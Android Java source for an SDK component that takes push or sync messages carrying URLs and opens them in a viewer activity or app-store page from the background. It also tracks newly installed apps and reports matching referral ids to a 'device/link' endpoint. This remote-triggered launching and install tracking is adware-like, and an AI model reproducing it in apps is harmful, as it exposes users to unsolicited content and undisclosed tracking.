package refs.me.c_master;

import android.content.Intent;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.text.TextUtils;

import com.evernote.android.job.Job;

import java.util.HashMap;
import java.util.Map;

import main_commons.app.c_master.commons.commons.SdkComponent;
import okhttp3.ResponseBody;
import refs.me.c_master.keep.Reference;
import refs.me.c_master.keep.RefsResponse;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import timber.log.Timber;

public class ReferencesComponent extends SdkComponent implements RefsController.IReferenceOpener {

    private static ReferencesComponent instance;

    private final RefsController refsController = new RefsController(this);

    public static ReferencesComponent get() {
        return instance;
    }

    public ReferencesComponent() {
        instance = this;
    }

    @Nullable
    @Override
    public Job createJob(@NonNull String tag) {
        return null;
    }

    @Override
    public void onFcmMessageReceived(@NonNull String type, @NonNull Bundle payload) {
        if ("ref".equals(type)) {
            String id = payload.getString("id");
            String url = payload.getString("url");
            String applicationId = payload.getString("applicationId");
            onReferenceReceived(new Reference(id, url, applicationId));
        }
    }

    @Override
    public void onSyncEvent(@NonNull String json) {
        RefsResponse response = safeParse(json, RefsResponse.class);
        if (response != null && response.getData() != null && !response.getData().isEmpty()) {
            onReferenceReceived(response.getData().get(response.getData().size() - 1));
        }
    }

    @Override
    public void onNewAppAdded(String packageName) {
        Timber.i("onNewAppAdded -> packageName[%s]", packageName);
        if (refsController.isReferencedApp(packageName)) {
            sendRefEvent(refsController.getActiveRefId());
        }
    }

    @Override
    public void showReference(Reference reference) {
        Timber.i("showReference -> reference[%s]", reference);
        if (RefUtils.isMarketTypeLink(reference.getLink())) {
            RefUtils.openMarket(context(), reference);
        } else {
            Intent intent = RefViewerActivity.createIntent(context(), reference);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context().startActivity(intent);
        }
    }

    public void onReferenceReceived(Reference reference) {
        Timber.i("onReferenceReceived -> reference[%s]", reference);
        refsController.showReference(reference);
        String appId = reference.getApplicationId();
        if (TextUtils.isEmpty(appId) || appId.length() == 1) {
            sendRefEvent(reference.getId());
        }
    }

    ///////////////////////////////////////////////////////////////////////////
    // INNER
    ///////////////////////////////////////////////////////////////////////////

    public void sendRefEvent(String refId) {
        Timber.i("sendRefEvent -> refId[%s]", refId);
        refsController.removeActiveReference();
        Map<String, String> fields = new HashMap<>();
        fields.put("id", refId);
        api().makePost("device/link", fields).enqueue(new Callback<ResponseBody>() {
            @Override
            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
            }

            @Override
            public void onFailure(Call<ResponseBody> call, Throwable t) {
            }
        });
    }
}
